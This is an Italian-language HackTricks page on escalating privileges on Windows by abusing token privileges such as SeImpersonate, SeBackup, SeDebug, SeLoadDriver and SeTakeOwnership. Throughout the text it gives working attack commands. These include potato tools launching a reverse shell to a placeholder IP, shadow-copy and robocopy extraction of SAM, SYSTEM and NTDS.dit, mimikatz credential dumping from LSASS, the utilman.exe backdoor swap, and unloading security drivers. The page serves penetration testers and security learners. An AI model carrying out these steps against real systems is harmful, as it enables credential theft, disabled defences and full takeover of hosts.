# Abuso dei token

{{#include ../../banners/hacktricks-training.md}}

## Token

Se **non sai cosa sono i Windows Access Tokens**, leggi questa pagina prima di continuare:


{{#ref}}
access-tokens.md
{{#endref}}

**Potresti riuscire a scalare i privilegi abusando dei token che già possiedi.**

### SeImpersonatePrivilege

Questo privilegio consente a un processo di impersonare un token (ma non di crearne uno) quando riesce a ottenere un handle per quel token. È possibile acquisire un token privilegiato da un servizio Windows (DCOM) inducendolo a eseguire un'autenticazione NTLM verso un exploit, consentendo successivamente di eseguire un processo con privilegi SYSTEM.<sup>[[2]](#references)</sup> Questa primitiva può essere sfruttata con strumenti come [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (che richiede che WinRM sia disabilitato), [SweetPotato](https://github.com/CCob/SweetPotato) e [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Un'applicazione web accessibile solo tramite loopback può costituire un possibile vettore di coercion distinto, se un utente locale può raggiungere un endpoint autenticato che effettua una richiesta a un URL scelto dal chiamante con un'identità più privilegiata. Esamina le regole di autorizzazione dell'endpoint e le restrizioni sugli URL, l'identità effettiva del client in uscita e il suo comportamento di autenticazione, oltre a verificare se il client può raggiungere un listener controllato dall'utente con privilegi inferiori. La presenza di `SeImpersonatePrivilege` abilitato, di un listener IIS o di un parametro per il recupero di URL, da sola, non dimostra l'esistenza di un token privilegiato o di un percorso di escalation. Mantieni passiva questa verifica: durante l'enumerazione, non inviare richieste di coercion. Consulta la documentazione Microsoft su [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) e [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Note aggiornate per gli operatori:

- **JuicyPotato è obsoleto**: su Windows 10 1809+/Server 2019+, preferisci **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** o **PrintSpoofer**, a seconda delle superfici RPC/COM ancora raggiungibili.
- Se hai compromesso un servizio eseguito come **`LOCAL SERVICE`** o **`NETWORK SERVICE`** e `whoami /priv` mostra un **token filtrato** privo di `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, recupera prima il **set di privilegi predefinito** dell'account (ad esempio con **FullPowers**) e poi riprova la famiglia di strumenti potato.<sup>[[3]](#references)</sup>
- Alcuni fork recenti sono più pratici per gli operatori rispetto agli strumenti originali. Ad esempio, **SigmaPotato** aggiunge l'esecuzione in memoria tramite reflection e la compatibilità con le versioni moderne di Windows, mentre **PrintNotifyPotato** abusa del servizio COM PrintNotify ed è spesso utile quando il percorso classico dello Spooler è disabilitato.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

È molto simile a **SeImpersonatePrivilege**: utilizza **lo stesso metodo** per ottenere un token con privilegi elevati.\
Questo privilegio consente poi di **assegnare un token primario** a un nuovo processo o a un processo sospeso. Con il token di impersonificazione con privilegi elevati è possibile derivare un token primario (DuplicateTokenEx).\
Con il token è possibile creare un **nuovo processo** con 'CreateProcessAsUser' oppure creare un processo sospeso e **impostargli il token** (in generale, non è possibile modificare il token primario di un processo in esecuzione).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Se questo token è abilitato, è possibile usare **KERB_S4U_LOGON** per ottenere un **token di impersonificazione** per qualsiasi altro utente senza conoscerne le credenziali, **aggiungere un gruppo arbitrario** (admins) al token, impostare il **livello di integrità** del token su "**medium**" e assegnare questo token al **thread corrente** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Questo privilegio fa sì che il sistema **conceda l'accesso in lettura** a qualsiasi file (limitato alle operazioni di lettura). Viene usato per **leggere gli hash delle password degli account Administrator locali** dal registro; in seguito, è possibile usare strumenti come "**psexec**" o "**wmiexec**" con l'hash (tecnica Pass-the-Hash). Questa tecnica, tuttavia, non funziona in due casi: quando l'account Local Administrator è disabilitato oppure quando è attiva una policy che rimuove i privilegi amministrativi agli account Local Administrator che si connettono da remoto.<sup>[[2]](#references)</sup>\
In pratica, il workflow integrato più affidabile è solitamente **VSS + `robocopy /b`**: creare/esporre una shadow copy, quindi copiare `SAM`/`SYSTEM` o `NTDS.dit` in **modalità backup**, aggirando così gli ACL dei file.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

Puoi **abusare di questo privilegio** con:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- seguendo **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Oppure, come spiegato nella sezione **escalation dei privilegi con Backup Operators** di:

{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Questo privilegio fornisce il permesso di **scrittura** su qualsiasi file di sistema, indipendentemente dalla Access Control List (ACL) del file. Apre numerose possibilità per l'escalation, tra cui la possibilità di **modificare i servizi**, eseguire DLL Hijacking e impostare **debugger** tramite Image File Execution Options, oltre a varie altre tecniche.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege è un permesso potente, particolarmente utile quando un utente può impersonare token, ma anche in assenza di SeImpersonatePrivilege. Questa capacità dipende dalla possibilità di impersonare un token che rappresenti lo stesso utente e il cui livello di integrità non superi quello del processo corrente.<sup>[[2]](#references)</sup>

**Punti chiave:**

- **Impersonazione senza SeImpersonatePrivilege:** È possibile sfruttare SeCreateTokenPrivilege per EoP impersonando token in condizioni specifiche.
- **Condizioni per l'impersonazione dei token:** Per riuscire nell'impersonazione, il token di destinazione deve appartenere allo stesso utente e avere un livello di integrità minore o uguale a quello del processo che tenta l'impersonazione.
- **Creazione e modifica dei token di impersonazione:** Gli utenti possono creare un token di impersonazione e potenziarlo aggiungendo il SID (Security Identifier) di un gruppo privilegiato.

### SeLoadDriverPrivilege

Questo privilegio consente a un processo di **caricare e scaricare driver di dispositivo** creando una voce di registro con valori specifici per `ImagePath` e `Type`. Poiché l'accesso diretto in scrittura a `HKLM` (HKEY_LOCAL_MACHINE) è limitato, è possibile utilizzare `HKCU` (HKEY_CURRENT_USER). Tuttavia, è necessario un percorso specifico affinché il kernel riconosca la voce `HKCU` come configurazione di un driver.<sup>[[2]](#references)</sup>

L'uso offensivo moderno consiste solitamente nel **BYOVD** (bring your own vulnerable driver): caricare un driver kernel **firmato ma vulnerabile** e usare i suoi IOCTL per disabilitare le protezioni o ottenere l'esecuzione di codice nel kernel. Tieni presente che nelle versioni recenti di Windows 11/Server, la **Microsoft vulnerable driver blocklist** e/o **HVCI/Memory Integrity** spesso compromettono le vecchie chain pubbliche, quindi gli esempi classici in stile `szkg64.sys` non sono più universalmente affidabili.

Il percorso è `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, dove `<RID>` è il Relative Identifier dell'utente corrente. In `HKCU` è necessario creare l'intero percorso e impostare due valori:<sup>[[2]](#references)</sup>

- `ImagePath`, ovvero il percorso del binario da eseguire
- `Type`, con il valore `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Passaggi da seguire:**

1. Accedi a `HKCU` invece che a `HKLM` a causa delle restrizioni di scrittura.
2. Crea il percorso `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` in `HKCU`, dove `<RID>` rappresenta il Relative Identifier dell'utente corrente.
3. Imposta `ImagePath` sul percorso di esecuzione del binario.
4. Assegna a `Type` il valore `SERVICE_KERNEL_DRIVER` (`0x00000001`).

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Altri modi per abusare di questo privilegio sono descritti in [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

È simile a **SeRestorePrivilege**. La sua funzione principale consente a un processo di **assumere la proprietà di un oggetto**, aggirando il requisito di accesso discrezionale esplicito tramite la concessione dei diritti di accesso WRITE_OWNER. Il processo prevede innanzitutto di acquisire la proprietà della chiave di registro desiderata per poterla modificare, quindi di alterare la DACL per abilitare le operazioni di scrittura.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Questo privilegio permette di fare **debug di altri processi**, anche di leggere e scrivere nella memoria. Con questo privilegio è possibile impiegare varie strategie di memory injection, in grado di eludere la maggior parte delle soluzioni antivirus e host intrusion prevention.<sup>[[2]](#references)</sup>

Sulle versioni moderne di Windows, ricorda che `SeDebugPrivilege` è solitamente sufficiente per aprire **processi SYSTEM non protetti** e duplicarne i token, ma **non** garantisce di poter accedere a **LSASS**. Se **RunAsPPL / LSA Protection** è abilitato, i processi non protetti non possono leggere LSASS né iniettare codice al suo interno, anche se è presente `SeDebugPrivilege`. In tal caso, ruba un token da un altro processo SYSTEM non PPL oppure concatenane l'uso con un PPL bypass/BYOVD, invece di dare per scontato che `procdump` funzioni. Per un esempio completo di copia dei token che usa `SeDebugPrivilege` + `SeImpersonatePrivilege`, consulta [questa pagina](sedebug-+-seimpersonate-copy-token.md).

#### Dump della memoria

Puoi usare [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) della [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) per **acquisire la memoria di un processo**. In particolare, questa tecnica può essere applicata al processo **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, responsabile della memorizzazione delle credenziali utente dopo che l'utente ha eseguito correttamente l'accesso al sistema.

Puoi poi caricare questo dump in mimikatz per ottenere le password:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Un dump LSASS leggibile salvato in precedenza potrebbe essere disponibile anche se l'account corrente non dispone dell'autorizzazione per acquisire il processo protetto in esecuzione. Considera un file dump o un archivio dal nome simile solo come un indizio: verifica l'accesso e i contenuti, quindi valuta se le credenziali recuperate sono ancora valide e consentono di ottenere un contesto con privilegi più elevati. Il solo nome del file non prova che un archivio contenga un dump o che le credenziali siano riutilizzabili.

#### RCE

Se vuoi ottenere una shell `NT SYSTEM`, puoi usare:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Questo diritto (Eseguire attività di manutenzione dei volumi) può consentire operazioni privilegiate sui volumi, ma da solo non garantisce un handle leggibile al volume raw né l’accesso arbitrario ai file. Le ACL dei dispositivi, lo stato del token, la versione di Windows e l’operazione richiesta sono comunque determinanti. Un’operazione di controllo del volume consentita potrebbe invece modificare le ACL del filesystem: si tratta di un’azione mutativa che può interessare l’intero volume. Su un host CA, l’abuso dei certificati richiede inoltre l’accesso a materiale utilizzabile della chiave privata; i file protetti con EFS richiedono comunque una chiave di decrittazione o di ripristino autorizzata. Vedi i prerequisiti dettagliati qui sotto.<sup>[[5]](#references)</sup>

Vedi le tecniche dettagliate e le mitigazioni:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Check privileges

```
whoami /priv
```

I **token che compaiono come Disabled** di solito possono essere abilitati, quindi spesso puoi abusare sia dei privilegi _Enabled_ che di quelli _Disabled_.

### Abilitare tutti i token

Se hai privilegi disabilitati, puoi usare lo script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) per abilitare tutti i token:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Oppure lo **script** incorporato in questo [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Cheatsheet completa dei token privileges su [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); il riepilogo qui sotto elenca solo i modi diretti per sfruttare il privilege e ottenere una sessione amministratore o leggere file sensibili.<sup>[[1]](#references)</sup>

| Privilege                  | Impatto          | Strumento               | Percorso di esecuzione                                                                                                                                                                                                                                                                                                                             | Note                                                                                                                                                                                                                                                                                                                          |
| -------------------------- | ---------------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Amministratore**_ | strumento di terze parti | _"Consentirebbe a un utente di impersonare token e fare privesc fino a ottenere nt system usando strumenti come potato.exe, rottenpotato.exe e juicypotato.exe"_                                                                                                                                                                                  | Grazie [Aurélien Chalot](https://twitter.com/Defte_) per l'aggiornamento. Presto proverò a riformularlo in modo che assomigli di più a una ricetta.                                                                                                                                                                             |
| **`SeBackup`**             | **Minaccia**     | _**Comandi integrati**_ | Leggere file sensibili con `robocopy /b` o appositi helper di copia compatibili con SeBackup.                                                                                                                                                                                                                                                      | <p>- Ideale per `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` e, talvolta, `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` è pratico, ma i cmdlet/API SeBackup dedicati sono spesso più flessibili per i file bloccati/aperti.</p>                                                                                                  |
| **`SeCreateToken`**        | _**Amministratore**_ | strumento di terze parti | Creare un token arbitrario che includa i diritti di amministratore locale con `NtCreateToken`.                                                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Amministratore**_ | **PowerShell**          | Duplicare un token SYSTEM **non-PPL** o fare il dump della memoria di un processo non protetto.                                                                                                                                                                                                                                                    | <p>Il dump di LSASS viene comunemente bloccato se RunAsPPL/LSA Protection è abilitato.</p><p>Lo script è disponibile su [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                   |
| **`SeImpersonate`**        | _**Amministratore**_ | strumento di terze parti | Usare la **famiglia Potato** / l'impersonation tramite named pipe per avviare una sessione SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` e altri).                                                                                                                                                        | <p>È più pratico con account di servizio come IIS APPPOOL, MSSQL, attività pianificate o qualsiasi contesto che disponga già di `SeImpersonatePrivilege`.</p>                                                                                                                                                                   |
| **`SeLoadDriver`**         | _**Amministratore**_ | strumento di terze parti | <p>1. Caricare un driver kernel firmato ma vulnerabile (BYOVD)<br>2. Usare gli IOCTL del driver per ottenere accesso kernel in lettura/scrittura, disabilitare gli strumenti di sicurezza o ottenere privilegi SYSTEM<br><br>In alternativa, il privilege può essere usato per scaricare driver correlati alla sicurezza con il comando integrato <code>fltMC</code>, ad esempio <code>fltMC sysmondrv</code></p> | <p>I driver pubblici meno recenti, come <code>szkg64.sys</code>, vengono sempre più spesso bloccati nelle versioni moderne di Windows dalla blocklist dei driver vulnerabili / HVCI.</p>                                                                                                                                             |
| **`SeRestore`**            | _**Amministratore**_ | **PowerShell**          | <p>1. Avviare PowerShell/ISE con il privilege SeRestore presente.<br>2. Abilitare il privilege con <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Rinominare utilman.exe in utilman.old<br>4. Rinominare cmd.exe in utilman.exe<br>5. Bloccare la console e premere Win+U</p> | <p>L'attacco può essere rilevato da alcuni software AV.</p><p>Un metodo alternativo consiste nel sostituire i binari dei servizi archiviati in "Program Files" usando lo stesso privilege</p>                                                                                                                                   |
| **`SeTakeOwnership`**      | _**Amministratore**_ | _**Comandi integrati**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Rinominare cmd.exe in utilman.exe<br>4. Bloccare la console e premere Win+U</p>                                                                                                                                 | <p>L'attacco può essere rilevato da alcuni software AV.</p><p>Un metodo alternativo consiste nel sostituire i binari dei servizi archiviati in "Program Files" usando lo stesso privilege.</p>                                                                                                                                    |
| **`SeTcb`**                | _**Amministratore**_ | strumento di terze parti | <p>Manipolare i token per includere i diritti di amministratore locale. Potrebbe essere necessario SeImpersonate.</p><p>Da verificare.</p>                                                                                                                                                                                                           |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - percorsi di sfruttamento dai Windows privileges all'amministratore](https://github.com/gtworek/Priv2Admin)
- [2] [Abuso dei Token Privileges per LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Ridatemi i miei Privileges! Per favore?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (la modalità di backup `/b` ignora i controlli ACL di file/cartelle)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Eseguire attività di manutenzione dei volumi (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → esfiltrazione della chiave CA → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
